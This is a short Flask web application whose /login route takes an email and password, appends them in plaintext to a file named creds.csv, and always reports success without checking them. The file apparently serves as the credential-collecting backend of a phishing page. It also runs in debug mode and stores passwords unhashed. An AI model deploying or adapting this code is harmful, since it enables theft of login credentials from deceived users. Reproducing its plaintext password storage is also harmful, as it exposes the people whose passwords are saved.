from flask import Flask, jsonify, request, redirect, render_template, url_for
import csv

app = Flask(__name__)

@app.route("/")
def index():
  return render_template("/index.html")

@app.route("/login", methods = ["POST"])
def login():
  email = request.json.get("email")
  pwrd = request.json.get("pwrd")
  with open("creds.csv", "a+") as f:
    csv_writer = csv.writer(f)
    csv_writer.writerow([email, pwrd])
    f.close()

  return jsonify({
    "status": "success"
  })

if __name__ == "__main__":
  app.run(debug=True)
